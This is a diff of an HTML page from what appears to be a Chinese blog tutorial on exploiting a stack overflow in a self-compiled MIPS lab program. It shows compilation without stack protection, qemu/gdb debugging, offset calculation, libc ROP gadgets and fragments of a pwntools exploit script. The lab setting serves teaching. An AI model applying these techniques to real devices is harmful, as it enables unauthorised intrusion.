@@ -34,7 +34,7 @@ sudo<span class=w> </span>apt-get<span class=w> </span>install<span class=w> </s
 sudo<span class=w> </span>apt-get<span class=w> </span>install<span class=w> </span>gcc-mipsel-linux-gnu
 </code></pre></div> 编译上面的源码 <div class=highlight><pre><span></span><code>mipsel-linux-gnu-gcc<span class=w> </span>-fno-stack-protector<span class=w> </span>stack_bof_02.c<span class=w> </span>-o<span class=w> </span>stack_bof_02
 </code></pre></div> 程序保护 <img alt=image-20201028025116416 src=https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028025118.png> 代码逻辑很简单，在 strcpy 的地方有一处栈溢出。</p> <blockquote> <p>程序调试 <code>qemu-mipsel-static -g 1234 -L ./mipsel ./vuln_system PAYLOAD</code> -g 指定调试端口， -L 指定 lib 等文件的目录，当程序起来之后 <code>gdb-multiarch stack_bof_02</code> 运行如下命令，然后在 gdb 里运行 <code>target remote 127.0.0.1:1234</code> 即可挂上调试器 <img alt=image-20201028032102193 src=https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028032104.png> 控制 PC <img alt=image-20201028030936453 src=https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028030938.png> 返回地址位于 $sp+532 , buf 位于 $fp+24 即 padding 为 <code>pay += b'a'*508</code> <div class=highlight><pre><span></span><code><span class=c1># padding :532 - 24 = 508</span>
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
 
@@ -146,7 +146,7 @@ Found 20 matching gadgets
   .text:00125690                 move    $a3, $v0
   .text:00125694                 move    $a1, $a0
   .text:00125698                 jalr    $t9
-</code></pre></div> 最后的 exploit</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> 最后的 exploit</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=c1># context.log_level = &#39;debug&#39;</span>
 
 <span class=n>libc_base</span> <span class=o>=</span> <span class=mh>0x7f61f000</span>
